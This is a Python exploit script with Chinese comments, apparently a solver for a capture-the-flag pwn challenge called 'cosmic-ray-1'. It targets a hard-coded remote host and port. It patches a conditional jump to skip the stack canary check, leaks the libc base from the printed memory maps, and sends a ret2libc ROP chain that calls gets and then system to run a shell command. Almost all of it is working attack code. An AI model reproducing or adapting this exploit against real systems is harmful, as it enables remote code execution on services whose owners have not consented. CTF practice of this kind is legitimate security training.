#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
cosmic-ray-1 远程利用脚本 —— 纯 Python3（无 pwntools / 无第三方依赖）

用法:
    python3 solve_remote.py                  # 打 110.42.112.160:44303
    python3 solve_remote.py HOST PORT        # 自定义目标

漏洞链:
    1. 单字节"宇宙射线": 文件偏移 0x120f 的 0x74(je) -> 0xeb(jmp)，跳过 canary 检查。
    2. 服务端打印 /proc/<pid>/maps，拿到 libc 基址。
    3. ret2libc: gets(bss) 把 "cat flag" 写入 libc 可写 .bss，再 system("cat flag")。

注意:
    - libc 可执行段里没有 pop rdx 之类的 gadget，所以不能直接 read(fd,buf,n) 写字符串，
      改用 gets(bss)（只需要 rdi）。
    - 用 ret 调整栈对齐，保证 gets / system 入口时 rsp % 16 == 8。
"""
import re
import socket
import struct
import sys

HOST = "110.42.112.160"
PORT = 44303

# ---- 附件 libc.so.6 的偏移（glibc 2.39 / ubuntu 24.04，与线上一致）----
POP_RDI = 0x10c08d   # pop rdi ; ret
RET     = 0x10c08e   # ret（= pop rdi 的下一个字节）
GETS    = 0x87160    # gets
SYSTEM  = 0x58750    # system
BSS     = 0x2056e0   # libc 可写 .bss

PATCH_OFF  = 0x120f  # je(0x74) -> jmp(0xeb)
PATCH_BYTE = 0xeb


def p64(x):
    return struct.pack("<Q", x & 0xFFFFFFFFFFFFFFFF)


def recv_until(s, mark, timeout=15.0):
    s.settimeout(timeout)
    data = b""
    while mark not in data:
        try:
            chunk = s.recv(4096)
        except socket.timeout:
            break
        if not chunk:
            break
        data += chunk
    return data


def build_payload(libc_base):
    # 栈布局: buf -> canary 88, canary 8, saved rbp 8
    payload = b"A" * 88 + b"B" * 8 + b"C" * 8
    # gets(bss)  ;  system(bss)
    payload += p64(libc_base + POP_RDI) + p64(libc_base + BSS)
    payload += p64(libc_base + RET)      # 对齐 gets 入口
    payload += p64(libc_base + GETS)
    payload += p64(libc_base + POP_RDI) + p64(libc_base + BSS)
    payload += p64(libc_base + RET)      # 对齐 system 入口
    payload += p64(libc_base + SYSTEM)
    # 第一次 read 最多读 240 字节：把 ROP 链垫满 240，"cat flag\n" 留给 gets 读入 bss
    payload = payload.ljust(240, b"\x00")
    payload += b"cat flag\n"
    return payload


def main():
    if len(sys.argv) >= 3:
        host, port = sys.argv[1], int(sys.argv[2])
    else:
        host, port = HOST, PORT
    print("[*] 目标 %s:%d" % (host, port))

    s = socket.create_connection((host, port), timeout=15)

    recv_until(s, b"location (hex file offset): ")
    s.sendall(b"120f\n")

    recv_until(s, b"machine code (hex byte): ")
    s.sendall(b"eb\n")

    data = recv_until(s, b"Enter exp (hex): ")

    libc_base = None
    for line in data.split(b"\n"):
        if b"libc.so.6" in line:
            libc_base = int(line.split(b"-")[0], 16)
            break
    if libc_base is None:
        print("[!] 没找到 libc.so.6，maps 如下：")
        print(data.decode(errors="replace"))
        return
    print("[*] libc base = %#x" % libc_base)

    payload = build_payload(libc_base)
    print("[*] 发送 exp (%d 字节)" % len(payload))
    s.sendall(payload.hex().encode() + b"\n")

    s.settimeout(5)
    out = b""
    while True:
        try:
            chunk = s.recv(4096)
        except socket.timeout:
            break
        if not chunk:
            break
        out += chunk

    print(out.decode(errors="replace"))
    m = re.search(rb"flag\{[^}]*\}", out)
    if m:
        print("\n[+] FLAG =", m.group().decode())


if __name__ == "__main__":
    main()
